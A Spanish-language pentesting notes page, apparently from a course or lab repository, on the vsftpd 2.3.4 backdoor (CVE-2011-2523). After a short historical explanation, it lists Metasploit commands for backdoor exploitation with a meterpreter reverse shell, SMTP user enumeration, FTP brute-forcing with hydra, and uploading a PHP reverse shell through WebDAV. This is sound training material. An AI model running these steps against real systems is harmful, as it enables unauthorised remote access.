# vsFTPd 2.3.4 Backdoor (CVE-2011-2523)

Uno de los servidores FTP más conocidos en sistemas Linux es **vsftpd (Very Secure FTP Daemon)**, que ha sido ampliamente utilizado en distribuciones como Ubuntu, CentOS y Fedora.

Sin embargo, la versión vsftpd 2.3.4 es conocida por estar asociada a la vulnerabilidad **CVE-2011-2523**, un caso histórico de ataque a la cadena de suministro. En este incidente, el archivo de distribución del software fue comprometido y se introdujo una backdoor en el binario distribuido. Como resultado, sistemas que instalaban esta versión podían quedar expuestos a acceso no autorizado y posible ejecución remota de comandos.

Este caso demuestra que una vulnerabilidad no siempre proviene de un fallo en el código o en la configuración, sino que puede originarse en la propia cadena de distribución del software. Por ello, la verificación de integridad de paquetes y la procedencia del software son aspectos críticos en la seguridad de sistemas.

### Explotación con MSF

```bash
msf > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution
msf > use 1
[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
msf exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts ip
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
```

Para convertir la sesión a meterpreter podemos poner la conexión en pausa (ctrl+z) y usar el módulo `shell_to_meterpreter`.

```bash
msf > use post/multi/manage/shell_to_meterpreter
msf post(multi/manage/shell_to_meterpreter) > set lhost ip_kali
msf post(multi/manage/shell_to_meterpreter) > set session id_bash
msf post(multi/manage/shell_to_meterpreter) > run
```

Esto crea la sesión meterpreter, pero no la abre. Para conectarnos a ella usamos `sessions id_meterpreter`.

### Explotación de la versión corregida

Al tratarse de un ataque a la cadena de suministro, no todas las versiones del código fuente de vsftpd 2.3.4 contienen un backdoor, ya que no es un fallo de programación.

Podemos encontrarnos el caso de que vsFTPd esté alojado en el mismo host que un servidor LAMP (Linux, Apache, MySQL, PHP). En este caso, siempre que vsFTPd esté mal configurado y permita acceso a los directorios del sistema, podemos subir un payload al directorio web para tratar de obtener una shell.

Empezamos enumerando los usuarios del servicio smtp en caso de estar disponible, ya que puede proporcionar una visión bastante amplia de los usuarios del servicio, lo que puede acercarnos a los usuarios de otros servicios. Para ello usamos el módulo `smtp_enum`

```bash
msf > use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(scanner/smtp/smtp_enum) > set rhosts
msf auxiliary(scanner/smtp/smtp_enum) > run
```

Es recomendable identificar los usuarios de servicio para descartarlos de fases posteriores, ya que son usuarios del sistema para administrar el servicio específico y no tienen habilitado el inicion de sesión. Algunos de ellos son:

| | **Servicio** | **Acción** |

| Usuario | Shell | Propósito/Servicio |
| :------ | :---- | :----------------- |
| `www-data` | `/usr/sbin/nologin` <br>*(o `/sbin/nologin`)* | Servidores web (Apache, Nginx, PHP-FPM). |
| `mysql` <br>*(o `postgres`)* | `/bin/false` o `nologin` | Sistemas de gestión de bases de datos. |
| `nobody` | `/usr/sbin/nologin` | Tareas genéricas de baja prioridad y sin privilegios (ej. NFS). |
| `mail` <br>*(o `postfix`, `dovecot`)* | `/usr/sbin/nologin` | Gestión y envío de correos electrónicos del sistema. |
| `daemon` | `/usr/sbin/nologin` | Ejecución de tareas en segundo plano del sistema (daemons). |
| `sshd` | `/usr/sbin/nologin` | Servidor OpenSSH (fase de pre-autenticación). |
| `ftp` | `/usr/sbin/nologin` | Servidores de transferencia de archivos (FTP). |
| `messagebus` <br>*(o `dbus`)* | `/usr/sbin/nologin` | Comunicación interna entre procesos del sistema (D-Bus). |
| `systemd-network` | `/usr/sbin/nologin` | Gestión de configuraciones de red de Systemd. |
| `bin`/`sys` | `/usr/sbin/nologin` | Propietarios heredados de binarios y archivos del sistema. |

Una vez identificado el usuario o usuarios, podemos lanzar un ataque de fuerza bruta con hydra sobre ftp para obtener contraseñas asociadas a este servicio:

```bash
hydra -l usuario -P /ruta/lista.txt <IP> ftp
```

Si el usuario que obtenemos nos permite navegar por el sistema de archivos y el servidor tiene habilitado (WebDAV)[../win/webdav.md], podemos subir el payload `/usr/share/webshells/php/php-reverse-shell.php` a `/var/www/dav`, ya que el usuario si tendrá permiso para subir archivos en este directorio. Antes de hacerlo será necesario modificarlo para incluir la dirección IP de nuestra máquina kali y el puerto de nuestro listener.

Por último, accedemos con el navegador a `host.com/dav/php-reverse-shell.php` para ejecutarlo y obtener la shell con el usuario `www-data`.

[⟵ Anterior](../05_sistema.md#explotación-windows)
